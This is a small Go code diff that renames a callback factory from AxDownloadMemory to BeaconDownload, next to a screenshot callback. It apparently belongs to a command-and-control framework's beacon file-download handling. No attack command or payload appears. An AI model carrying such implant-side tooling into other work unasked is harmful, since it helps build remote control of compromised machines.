@@ -663,8 +663,7 @@ func AxAddScreenshot(channel chan<- interface{}) func(uintptr, uintptr, int) uin
 	}
 }
 
-// export AxDownloadMemory
-func AxDownloadMemory(channel chan<- interface{}) func(uintptr, uintptr, int) uintptr {
+func BeaconDownload(channel chan<- interface{}) func(uintptr, uintptr, int) uintptr {
 	return func(filename uintptr, data uintptr, length int) uintptr {
 		if length <= 0 {
 			return 0
